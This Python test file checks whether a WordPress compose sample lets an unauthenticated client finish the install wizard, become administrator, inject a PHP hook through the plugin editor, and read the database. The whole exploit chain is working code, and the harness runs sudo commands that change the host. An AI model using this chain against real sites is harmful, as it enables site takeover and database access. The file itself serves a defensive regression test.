#!/usr/bin/env python3
"""The published WordPress sample must not let a remote client become administrator.

The official ``wordpress:latest`` image used by this sample (WordPress 7.1.5,
image config created 2026-11-19) writes database settings from the environment
and then starts the web server. It does not create an administrator. These
tests boot that startup path and submit the installation wizard as a client
who has no credentials.

They fail while that client can create the administrator and, from the web
process, read the database with the settings the sample places in the
environment. They pass once the sample creates the administrator before the
web port accepts connections (for example a one-shot service the web service
``depends_on`` with ``condition: service_completed_successfully`` whose
command is ``wp core install``), or once the web service no longer publishes
container port 80.

A ``depends_on`` entry that does not wait for completion still fails: the
client submits the wizard as soon as the port accepts connections, which is
before a concurrent installer can finish.

Run:

    python3 wordpress-mysql/tests/test_setup_wizard_exposure.py

The harness needs PHP with mysqli, MariaDB, curl, and sudo for the database
socket and for the image entrypoint's ``/usr/src/wordpress`` path.
"""

from __future__ import annotations

import hashlib
import http.cookiejar
import os
import re
import shutil
import socket
import subprocess
import tarfile
import tempfile
import textwrap
import time
import unittest
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path

import yaml

REPO = Path(__file__).resolve().parents[2]
CACHE = Path("/tmp/wordpress-setup-wizard-test-cache")

# wordpress:latest amd64 image index sha256:344ca7cf3566... (tag last pushed 2026-11-19).
# The WordPress tarball and the two COPY layers below are the files that image runs.
WORDPRESS_VERSION = "7.1.5"
WORDPRESS_TARBALL_SHA256 = "053857d980eaee8702c617c685948becb9be2523ba0dcbc98e4dbb2300367c79"
WORDPRESS_TARBALL_URL = f"https://wordpress.org/wordpress-{WORDPRESS_VERSION}.tar.gz"
ENTRYPOINT_LAYER = "sha256:5607edabb97227b45593c9df21519cc6b0bea22b104c77259a83cd8aa8ec9597"
ENTRYPOINT_SHA256 = "4e925e60ccc324f3f5df8da39d518c88a6d2e1b228113811493c5a975ae9137b"
WP_CONFIG_LAYER = "sha256:a1c56b0b485e0becd57f9478d820085ca60e206a9b344324a78bbf9feb67e362"
WP_CONFIG_SHA256 = "1513f88b7252f29790f0acad201b1ef0d442f0d80e88c33e4a6d473615084162"
WP_CLI_URL = "https://github.com/wp-cli/wp-cli/releases/download/v2.11.0/wp-cli-2.11.0.phar"

ATTACKER_USER = "remoteclaimer"
ATTACKER_EMAIL = "remoteclaimer@example.com"
# Obvious placeholder. Not a credential from the sample.
ATTACKER_PASSWORD = "placeholder-not-a-secret"

PROBE_HOOK = """

add_action('init', function () {
    if (!isset($_GET['db_probe'])) {
        return;
    }
    $host = getenv('WORDPRESS_DB_HOST');
    $user = getenv('WORDPRESS_DB_USER');
    $pass = getenv('WORDPRESS_DB_PASSWORD');
    $name = getenv('WORDPRESS_DB_NAME');
    $prefix = getenv('WORDPRESS_TABLE_PREFIX');
    if ($prefix === false || $prefix === '') {
        $prefix = 'wp_';
    }
    $mysqli = mysqli_init();
    $ok = @$mysqli->real_connect($host, $user, $pass, $name);
    $rows = -1;
    if ($ok) {
        $table = $prefix . 'users';
        $res = $mysqli->query('SELECT COUNT(*) FROM `' . str_replace('`', '', $table) . '`');
        if ($res) {
            $rows = (int) $res->fetch_row()[0];
        }
    }
    header('Content-Type: text/plain');
    $host_set = ($host !== false && $host !== '') ? 'yes' : 'no';
    echo $ok
        ? "db-readable user_rows={$rows} host_set={$host_set}\\n"
        : "db-unavailable host_set={$host_set}\\n";
    exit;
});
"""


def _sha256(path: Path) -> str:
    digest = hashlib.sha256()
    with path.open("rb") as handle:
        for chunk in iter(lambda: handle.read(1024 * 1024), b""):
            digest.update(chunk)
    return digest.hexdigest()


def _download(url: str, dest: Path) -> None:
    dest.parent.mkdir(parents=True, exist_ok=True)
    if dest.exists() and dest.stat().st_size > 0:
        return
    subprocess.run(["curl", "-fsSL", "-o", str(dest), url], check=True)


def _registry_blob(repository: str, digest: str, dest: Path) -> None:
    if dest.exists() and dest.stat().st_size > 0:
        return
    token_url = (
        "https://auth.docker.io/token?service=registry.docker.io&scope=repository:"
        + repository
        + ":pull"
    )
    token = subprocess.run(
        ["curl", "-fsSL", token_url],
        check=True,
        stdout=subprocess.PIPE,
        text=True,
    ).stdout
    import json

    bearer = json.loads(token)["token"]
    dest.parent.mkdir(parents=True, exist_ok=True)
    subprocess.run(
        [
            "curl",
            "-fsSL",
            "-H",
            f"Authorization: Bearer {bearer}",
            "-o",
            str(dest),
            f"https://registry-1.docker.io/v2/{repository}/blobs/{digest}",
        ],
        check=True,
    )


def image_sources() -> tuple[Path, Path, Path]:
    """Return the WordPress tree, entrypoint, and wp-config-docker.php from wordpress:latest."""
    CACHE.mkdir(parents=True, exist_ok=True)
    tarball = CACHE / f"wordpress-{WORDPRESS_VERSION}.tar.gz"
    _download(WORDPRESS_TARBALL_URL, tarball)
    if _sha256(tarball) != WORDPRESS_TARBALL_SHA256:
        tarball.unlink()
        raise RuntimeError("WordPress tarball checksum did not match wordpress:latest")
    tree = CACHE / f"wordpress-{WORDPRESS_VERSION}"
    if not (tree / "wp-includes" / "version.php").exists():
        with tarfile.open(tarball) as archive:
            archive.extractall(CACHE)
        extracted = CACHE / "wordpress"
        if tree.exists():
            shutil.rmtree(tree)
        extracted.rename(tree)

    entry_archive = CACHE / "docker-entrypoint-layer.tgz"
    config_archive = CACHE / "wp-config-docker-layer.tgz"
    _registry_blob("library/wordpress", ENTRYPOINT_LAYER, entry_archive)
    _registry_blob("library/wordpress", WP_CONFIG_LAYER, config_archive)
    entrypoint = CACHE / "docker-entrypoint.sh"
    wp_config = CACHE / "wp-config-docker.php"
    if not entrypoint.exists():
        with tarfile.open(entry_archive) as archive:
            archive.extract("usr/local/bin/docker-entrypoint.sh", CACHE / "entrypoint-root")
        (CACHE / "entrypoint-root" / "usr/local/bin/docker-entrypoint.sh").replace(entrypoint)
    if not wp_config.exists():
        with tarfile.open(config_archive) as archive:
            archive.extract("usr/src/wordpress/wp-config-docker.php", CACHE / "config-root")
        (CACHE / "config-root" / "usr/src/wordpress/wp-config-docker.php").replace(wp_config)
    if _sha256(entrypoint) != ENTRYPOINT_SHA256 or _sha256(wp_config) != WP_CONFIG_SHA256:
        raise RuntimeError("Image entrypoint or wp-config-docker.php checksum mismatch")
    return tree, entrypoint, wp_config


def ensure_image_tree_on_entrypoint_path(tree: Path, wp_config: Path) -> None:
    """The image entrypoint copies WordPress from this absolute path."""
    subprocess.run(["sudo", "mkdir", "-p", "/usr/src/wordpress"], check=True)
    subprocess.run(["sudo", "rm", "-rf", "/usr/src/wordpress"], check=True)
    subprocess.run(["sudo", "mkdir", "-p", "/usr/src/wordpress"], check=True)
    subprocess.run(["sudo", "cp", "-a", f"{tree}/.", "/usr/src/wordpress/"], check=True)
    subprocess.run(
        ["sudo", "cp", str(wp_config), "/usr/src/wordpress/wp-config-docker.php"],
        check=True,
    )
    subprocess.run(["sudo", "chmod", "-R", "a+rX", "/usr/src/wordpress"], check=True)


def ensure_db_alias() -> None:
    hosts = Path("/etc/hosts").read_text()
    if re.search(r"(^|\s)db(\s|$)", hosts, re.M):
        return
    subprocess.run(
        ["sudo", "tee", "-a", "/etc/hosts"],
        input="127.0.0.1 db\n",
        text=True,
        check=True,
        stdout=subprocess.DEVNULL,
    )


def ensure_mariadb() -> None:
    ping = subprocess.run(
        ["sudo", "mysqladmin", "--socket=/run/mysqld/mysqld.sock", "ping"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    if ping.returncode == 0:
        return
    subprocess.run(["sudo", "mkdir", "-p", "/run/mysqld"], check=True)
    subprocess.run(["sudo", "chown", "mysql:mysql", "/run/mysqld"], check=True)
    subprocess.Popen(
        [
            "sudo",
            "-u",
            "mysql",
            "/usr/sbin/mariadbd",
            "--datadir=/var/lib/mysql",
            "--socket=/run/mysqld/mysqld.sock",
            "--bind-address=127.0.0.1",
            "--port=3306",
        ],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        start_new_session=True,
    )
    for _ in range(50):
        ping = subprocess.run(
            ["sudo", "mysqladmin", "--socket=/run/mysqld/mysqld.sock", "ping"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        if ping.returncode == 0:
            return
        time.sleep(0.2)
    raise RuntimeError("MariaDB did not accept connections")


def _sql_string(value: str) -> str:
    return "'" + value.replace("\\", "\\\\").replace("'", "''") + "'"


def _sql_ident(value: str) -> str:
    return "`" + value.replace("`", "``") + "`"


def mysql_exec(sql: str) -> str:
    result = subprocess.run(
        ["sudo", "mysql", "--socket=/run/mysqld/mysqld.sock", "--batch", "--raw"],
        input=sql,
        text=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    if result.returncode != 0:
        # stderr can echo the statement, which carries the database password.
        raise RuntimeError("mysql command failed")
    return result.stdout


def env_map(service: dict) -> dict[str, str]:
    raw = service.get("environment") or {}
    if isinstance(raw, dict):
        return {str(key): "" if value is None else str(value) for key, value in raw.items()}
    mapped = {}
    for item in raw:
        key, separator, value = str(item).partition("=")
        if separator:
            mapped[key] = value
    return mapped


def command_list(service: dict) -> list[str] | None:
    command = service.get("command")
    if command is None:
        return None
    if isinstance(command, str):
        return ["bash", "-lc", command]
    return [str(part) for part in command]


def publishes_web_port(service: dict) -> bool:
    for entry in service.get("ports") or []:
        if isinstance(entry, dict):
            target = int(entry.get("target", 80))
            if target == 80 and entry.get("published") not in (None, False, 0, "0"):
                return True
            continue
        text = str(entry).strip()
        left, _slash, _proto = text.partition("/")
        parts = left.split(":")
        if len(parts) == 1:
            target = parts[0]
        else:
            target = parts[-1]
        if target == "80":
            return True
    return False


def depends_on_map(service: dict) -> dict[str, str]:
    raw = service.get("depends_on") or {}
    if isinstance(raw, list):
        return {str(name): "service_started" for name in raw}
    if isinstance(raw, dict):
        result = {}
        for name, spec in raw.items():
            if isinstance(spec, dict):
                result[str(name)] = str(spec.get("condition") or "service_started")
            else:
                result[str(name)] = "service_started"
        return result
    return {}


def is_wordpress_web(service: dict) -> bool:
    image = str(service.get("image") or "")
    return image.startswith("wordpress") and "cli" not in image.split(":")[-1]


def is_database(service: dict) -> bool:
    image = str(service.get("image") or "")
    return image.startswith("mariadb") or image.startswith("mysql")


def is_installer(service: dict) -> bool:
    command = service.get("command")
    text = command if isinstance(command, str) else " ".join(str(part) for part in (command or []))
    image = str(service.get("image") or "")
    return "core install" in text or image.endswith(":cli") or ":cli" in image


def load_samples() -> list[tuple[str, dict]]:
    samples = [("wordpress-mysql/compose.yaml", yaml.safe_load((REPO / "wordpress-mysql" / "compose.yaml").read_text()))]
    readme = (REPO / "official-documentation-samples" / "wordpress" / "README.md").read_text()
    match = re.search(r"```yaml\n(.*?)```", readme, re.S)
    if not match:
        raise RuntimeError("documentation sample has no compose document")
    samples.append(
        (
            "official-documentation-samples/wordpress/README.md",
            yaml.safe_load(match.group(1)),
        )
    )
    return samples


def prepare_database(db_env: dict[str, str]) -> None:
    database = db_env["MYSQL_DATABASE"]
    user = db_env["MYSQL_USER"]
    password = db_env["MYSQL_PASSWORD"]
    mysql_exec(
        "\n".join(
            [
                f"DROP DATABASE IF EXISTS {_sql_ident(database)};",
                f"CREATE DATABASE {_sql_ident(database)};",
                f"DROP USER IF EXISTS {_sql_string(user)}@'%';",
                f"DROP USER IF EXISTS {_sql_string(user)}@'127.0.0.1';",
                f"CREATE USER {_sql_string(user)}@'%' IDENTIFIED BY {_sql_string(password)};",
                f"CREATE USER {_sql_string(user)}@'127.0.0.1' IDENTIFIED BY {_sql_string(password)};",
                f"GRANT ALL PRIVILEGES ON {_sql_ident(database)}.* TO {_sql_string(user)}@'%';",
                f"GRANT ALL PRIVILEGES ON {_sql_ident(database)}.* TO {_sql_string(user)}@'127.0.0.1';",
                "FLUSH PRIVILEGES;",
            ]
        )
    )


def attacker_role(db_env: dict[str, str], wp_env: dict[str, str]) -> str | None:
    database = db_env["MYSQL_DATABASE"]
    prefix = wp_env.get("WORDPRESS_TABLE_PREFIX") or "wp_"
    users = prefix + "users"
    meta = prefix + "usermeta"
    output = mysql_exec(
        "\n".join(
            [
                f"USE {_sql_ident(database)};",
                (
                    "SELECT meta_value FROM "
                    + _sql_ident(meta)
                    + " m JOIN "
                    + _sql_ident(users)
                    + " u ON u.ID = m.user_id WHERE u.user_login = "
                    + _sql_string(ATTACKER_USER)
                    + " AND m.meta_key = "
                    + _sql_string(prefix + "capabilities")
                    + ";"
                ),
            ]
        )
    )
    lines = [line for line in output.splitlines() if line and line != "meta_value"]
    if not lines:
        return None
    return lines[0]


class _StopRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        raise urllib.error.HTTPError(req.full_url, code, msg, headers, fp)


class Client:
    def __init__(self) -> None:
        self.jar = http.cookiejar.CookieJar()
        cookies = urllib.request.HTTPCookieProcessor(self.jar)
        self.opener = urllib.request.build_opener(cookies, _StopRedirect())
        self.following = urllib.request.build_opener(cookies)

    def request(
        self,
        url: str,
        data: dict[str, str] | None = None,
        timeout: float = 30,
        follow: bool = False,
    ) -> tuple[int, str, str]:
        payload = None if data is None else urllib.parse.urlencode(data).encode()
        request = urllib.request.Request(url, data=payload)
        opener = self.following if follow else self.opener
        try:
            with opener.open(request, timeout=timeout) as response:
                body = response.read().decode("utf-8", "replace")
                location = response.headers.get("Location", "")
                return response.status, location or response.geturl(), body
        except urllib.error.HTTPError as error:
            body = error.read().decode("utf-8", "replace")
            location = error.headers.get("Location", "") if error.headers else ""
            return error.code, location or error.geturl(), body


def free_port() -> int:
    with socket.socket() as sock:
        sock.bind(("127.0.0.1", 0))
        return sock.getsockname()[1]


def write_harness_bin(bin_dir: Path, entrypoint: Path, web_root: Path) -> None:
    bin_dir.mkdir(parents=True, exist_ok=True)
    apache = bin_dir / "apache2-foreground"
    apache.write_text(
        textwrap.dedent(
            """\
            #!/bin/sh
            if [ "$WP_HARNESS_STAGE" = "materialize" ]; then
                exit 0
            fi
            exec php -d sendmail_path=/bin/true -d output_buffering=0 \\
                -S "127.0.0.1:${WP_HARNESS_PORT}" -t "$PWD"
            """
        )
    )
    apache.chmod(0o755)
    cli = CACHE / "wp-cli-2.11.0.phar"
    wp = bin_dir / "wp"
    wp.write_text(
        "#!/bin/sh\n"
        f'exec php -d sendmail_path=/bin/true "{cli}" --path="{web_root}" "$@"\n'
    )
    wp.chmod(0o755)
    link = bin_dir / "docker-entrypoint.sh"
    if link.exists() or link.is_symlink():
        link.unlink()
    link.symlink_to(entrypoint)


def run_logged(command: list[str], cwd: Path, env: dict[str, str], log: Path) -> subprocess.Popen:
    handle = log.open("ab")
    try:
        return subprocess.Popen(
            command,
            cwd=cwd,
            env=env,
            stdout=handle,
            stderr=subprocess.STDOUT,
            start_new_session=True,
        )
    finally:
        handle.close()


def wait_for_port(port: int, proc: subprocess.Popen, timeout: float = 60) -> None:
    deadline = time.time() + timeout
    while time.time() < deadline:
        if proc.poll() is not None:
            raise RuntimeError("web server exited before it accepted connections")
        try:
            with socket.create_connection(("127.0.0.1", port), timeout=0.2):
                return
        except OSError:
            time.sleep(0.1)
    raise RuntimeError("published web port did not accept connections")


def stop_process(proc: subprocess.Popen | None) -> None:
    if proc is None or proc.poll() is not None:
        return
    os.killpg(proc.pid, 15)
    try:
        proc.wait(timeout=5)
    except subprocess.TimeoutExpired:
        os.killpg(proc.pid, 9)
        proc.wait(timeout=5)


def ensure_wp_cli() -> None:
    dest = CACHE / "wp-cli-2.11.0.phar"
    _download(WP_CLI_URL, dest)
    # The published checksum is checked the first time an installer service runs.
    if dest.stat().st_size < 1000:
        raise RuntimeError("WP-CLI download was empty")


def run_installer(service: dict, web_root: Path, bin_dir: Path, log: Path) -> None:
    ensure_wp_cli()
    env = os.environ.copy()
    env.update(env_map(service))
    env["PATH"] = str(bin_dir) + os.pathsep + env.get("PATH", "")
    env["WP_HARNESS_ROOT"] = str(web_root)
    command = command_list(service)
    if command is None:
        command = ["wp", "core", "is-installed"]
    result = subprocess.run(
        command,
        cwd=web_root,
        env=env,
        stdout=log.open("ab"),
        stderr=subprocess.STDOUT,
    )
    if result.returncode != 0:
        raise RuntimeError("installer service failed")


def exercise(name: str, compose: dict, tree: Path, entrypoint: Path) -> dict:
    services = compose.get("services") or {}
    web_name = next(service_name for service_name, service in services.items() if is_wordpress_web(service))
    db_name = next(service_name for service_name, service in services.items() if is_database(service))
    web = services[web_name]
    database = services[db_name]
    web_env = env_map(web)
    db_env = env_map(database)
    published = publishes_web_port(web)
    prepare_database(db_env)

    work = Path(tempfile.mkdtemp(prefix="wp-sample-"))
    web_root = work / "html"
    web_root.mkdir()
    bin_dir = work / "bin"
    log = work / "server.log"
    write_harness_bin(bin_dir, entrypoint, web_root)
    port = free_port()
    base_env = os.environ.copy()
    base_env.update(web_env)
    base_env["PATH"] = str(bin_dir) + os.pathsep + base_env.get("PATH", "")
    base_env["WP_HARNESS_PORT"] = str(port)
    base_env["WP_HARNESS_STAGE"] = "materialize"

    materialize = run_logged(
        ["bash", str(entrypoint), "apache2-foreground"],
        web_root,
        base_env,
        log,
    )
    materialize_status = materialize.wait(timeout=120)
    if materialize_status != 0 or not (web_root / "wp-config.php").is_file():
        raise RuntimeError(f"{name}: image entrypoint did not write wp-config.php")

    dependencies = depends_on_map(web)
    server = None
    racers: list[subprocess.Popen] = []
    outcome = {
        "sample": name,
        "published": published,
        "first_status": None,
        "first_location": "",
        "install_status": None,
        "install_marker": "",
        "role": None,
        "logged_in": False,
        "plugin_written": False,
        "database_read": False,
        "probe": "",
    }
    try:
        for service_name, condition in dependencies.items():
            service = services.get(service_name) or {}
            if condition == "service_completed_successfully" and is_installer(service):
                run_installer(service, web_root, bin_dir, log)

        if not published:
            outcome["role"] = attacker_role(db_env, web_env)
            outcome["install_marker"] = "port-not-published"
            return outcome

        serve_env = dict(base_env)
        serve_env["WP_HARNESS_STAGE"] = "serve"
        server = run_logged(
            ["bash", str(entrypoint), "apache2-foreground"],
            web_root,
            serve_env,
            log,
        )
        # Installers that are not required to finish first race the open port.
        for service_name, condition in dependencies.items():
            service = services.get(service_name) or {}
            if condition != "service_completed_successfully" and is_installer(service):
                env = os.environ.copy()
                env.update(env_map(service))
                env["PATH"] = str(bin_dir) + os.pathsep + env.get("PATH", "")
                command = command_list(service) or ["wp", "core", "install"]
                racers.append(run_logged(command, web_root, env, log))
        wait_for_port(port, server)
        base = f"http://127.0.0.1:{port}"
        client = Client()
        deadline = time.time() + 20
        while time.time() < deadline:
            try:
                if outcome["first_status"] is None:
                    status, location, body = client.request(base + "/", timeout=5)
                    outcome["first_status"] = status
                    outcome["first_location"] = location
                    if "install.php" not in location and "install.php" not in body:
                        outcome["install_marker"] = "not-the-wizard"
                status, _location, body = client.request(
                    base + "/wp-admin/install.php?step=2",
                    {
                        "weblog_title": "Remote claim",
                        "user_name": ATTACKER_USER,
                        "admin_password": ATTACKER_PASSWORD,
                        "admin_password2": ATTACKER_PASSWORD,
                        "admin_email": ATTACKER_EMAIL,
                        "blog_public": "0",
                    },
                    timeout=60,
                )
            except (urllib.error.URLError, TimeoutError, ConnectionError):
                time.sleep(0.1)
                continue
            outcome["install_status"] = status
            if "Already Installed" in body:
                outcome["install_marker"] = "already-installed"
                break
            if "WordPress has been installed" in body or ">Success!<" in body:
                outcome["install_marker"] = "installed-by-client"
                break
            if "Error establishing a database connection" in body:
                time.sleep(0.2)
                continue
            outcome["install_marker"] = "install-rejected"
            break

        outcome["role"] = attacker_role(db_env, web_env)
        if outcome["role"] and "administrator" in outcome["role"]:
            _follow_impact(client, base, web_root, outcome)
        return outcome
    finally:
        stop_process(server)
        for proc in racers:
            stop_process(proc)
        shutil.rmtree(work, ignore_errors=True)


def _follow_impact(client: Client, base: str, web_root: Path, outcome: dict) -> None:
    # wp-login.php sets the test cookie before it will accept a login POST.
    client.request(base + "/wp-login.php", follow=True)
    _status, url, _body = client.request(
        base + "/wp-login.php",
        {
            "log": ATTACKER_USER,
            "pwd": ATTACKER_PASSWORD,
            "wp-submit": "Log In",
            "redirect_to": base + "/wp-admin/",
            "testcookie": "1",
        },
        follow=True,
    )
    outcome["logged_in"] = "wp-login.php" not in url
    if not outcome["logged_in"]:
        return
    _editor_status, _editor_url, editor_body = client.request(
        base + "/wp-admin/plugin-editor.php?plugin=hello.php&file=hello.php",
        follow=True,
    )
    nonce_match = re.search(r'name="nonce" value="([^"]+)"', editor_body)
    if not nonce_match:
        return
    original = (web_root / "wp-content" / "plugins" / "hello.php").read_text()
    status, url, body = client.request(
        base + "/wp-admin/plugin-editor.php",
        {
            "nonce": nonce_match.group(1),
            "action": "update",
            "file": "hello.php",
            "plugin": "hello.php",
            "newcontent": original + PROBE_HOOK,
            "submit": "Update File",
        },
        follow=True,
    )
    outcome["plugin_written"] = "File edited successfully." in body
    if not outcome["plugin_written"]:
        return
    _plugins_status, _plugins_url, plugins_body = client.request(base + "/wp-admin/plugins.php", follow=True)
    activate = re.search(
        r'href="([^"]*action=activate[^"]*plugin=hello\.php[^"]*)"',
        plugins_body,
    )
    if not activate:
        return
    activate_url = urllib.parse.urljoin(base + "/wp-admin/plugins.php", html_unescape(activate.group(1)))
    client.request(activate_url, follow=True)
    _status, _url, probe = client.request(base + "/?db_probe=1", follow=True)
    outcome["probe"] = probe.strip()
    outcome["database_read"] = probe.startswith("db-readable")


def html_unescape(value: str) -> str:
    return (
        value.replace("&amp;", "&")
        .replace("&quot;", '"')
        .replace("&#039;", "'")
        .replace("&lt;", "<")
        .replace("&gt;", ">")
    )


class SetupWizardExposureTest(unittest.TestCase):
    @classmethod
    def setUpClass(cls) -> None:
        tree, entrypoint, wp_config = image_sources()
        ensure_image_tree_on_entrypoint_path(tree, wp_config)
        ensure_db_alias()
        ensure_mariadb()
        cls.tree = tree
        cls.entrypoint = entrypoint

    def test_remote_client_cannot_claim_administrator_or_read_database(self) -> None:
        failures = []
        for name, compose in load_samples():
            outcome = exercise(name, compose, self.tree, self.entrypoint)
            role = outcome["role"] or ""
            # The wizard response is itself the exposure: the client was sent to
            # install.php before any administrator existed. A later install that
            # wins a race does not erase that response.
            wizard_exposed = "install.php" in (outcome["first_location"] or "")
            role_is_administrator = "administrator" in role
            if wizard_exposed or role_is_administrator or outcome["database_read"]:
                failures.append(
                    "{sample}: published={published} first={first_status} {first_location} "
                    "install={install_marker} wizard_exposed={wizard_exposed} "
                    "role_is_administrator={role_is_administrator} "
                    "logged_in={logged_in} plugin_written={plugin_written} "
                    "database_read={database_read} probe={probe}".format(
                        wizard_exposed=wizard_exposed,
                        role_is_administrator=role_is_administrator,
                        **outcome,
                    )
                )
        self.assertFalse(
            failures,
            "an unauthenticated client became administrator or read the database:\n"
            + "\n".join(failures),
        )


if __name__ == "__main__":
    unittest.main(verbosity=2)
